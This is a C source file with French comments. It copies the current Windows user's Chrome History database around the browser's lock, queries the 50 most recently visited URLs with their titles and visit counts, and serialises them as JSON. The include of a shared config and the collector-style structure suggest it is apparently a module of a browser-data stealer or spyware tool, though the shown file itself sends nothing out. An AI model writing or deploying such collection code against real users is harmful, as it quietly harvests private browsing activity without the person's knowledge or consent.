#include "browser_history.h"
#include "sqlite3.h"
#include "../config.h"
#include <windows.h>
#include <stdio.h>
#include <string.h>

/* Remplace les caractères problématiques pour le JSON */
static void sanitize(char *s) {
    for (; *s; s++) {
        if (*s == '"' || *s == '\\' || *s == '\n' || *s == '\r')
            *s = ' ';
    }
}

void get_browser_history(char *out, size_t out_size) {
    char userprofile[MAX_PATH];
    GetEnvironmentVariable("USERPROFILE", userprofile, MAX_PATH);

    char history_path[MAX_PATH];
    snprintf(history_path, sizeof(history_path),
             "%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History",
             userprofile);

    /* Chrome verrouille le fichier — on le copie d'abord */
    const char *tmp = "chrome_history_tmp.db";
    if (!CopyFile(history_path, tmp, FALSE)) {
        snprintf(out, out_size,
                 "[{\"url\":\"Chrome inaccessible ou non installe\","
                 "\"title\":\"\",\"visits\":0}]");
        return;
    }

    sqlite3 *db;
    if (sqlite3_open(tmp, &db) != SQLITE_OK) {
        snprintf(out, out_size,
                 "[{\"url\":\"Impossible d ouvrir la DB Chrome\","
                 "\"title\":\"\",\"visits\":0}]");
        DeleteFile(tmp);
        return;
    }

    const char *sql =
        "SELECT url, title, visit_count "
        "FROM urls ORDER BY last_visit_time DESC LIMIT 50";
    sqlite3_stmt *stmt;

    if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) != SQLITE_OK) {
        snprintf(out, out_size,
                 "[{\"url\":\"Requete SQL echouee\",\"title\":\"\",\"visits\":0}]");
        sqlite3_close(db);
        DeleteFile(tmp);
        return;
    }

    size_t pos = 0;
    pos += snprintf(out + pos, out_size - pos, "[");
    int first = 1;

    while (sqlite3_step(stmt) == SQLITE_ROW) {
        const char *raw_url   = (const char *)sqlite3_column_text(stmt, 0);
        const char *raw_title = (const char *)sqlite3_column_text(stmt, 1);
        int visits = sqlite3_column_int(stmt, 2);

        char url[512]   = {0};
        char title[256] = {0};
        strncpy(url,   raw_url   ? raw_url   : "", sizeof(url)   - 1);
        strncpy(title, raw_title ? raw_title : "", sizeof(title) - 1);

        sanitize(url);
        sanitize(title);

        if (!first) pos += snprintf(out + pos, out_size - pos, ",");
        first = 0;
        pos += snprintf(out + pos, out_size - pos,
                        "{\"url\":\"%s\",\"title\":\"%s\",\"visits\":%d}",
                        url, title, visits);

        if (pos >= out_size - 600) break;
    }

    snprintf(out + pos, out_size - pos, "]");

    sqlite3_finalize(stmt);
    sqlite3_close(db);
    DeleteFile(tmp);
}
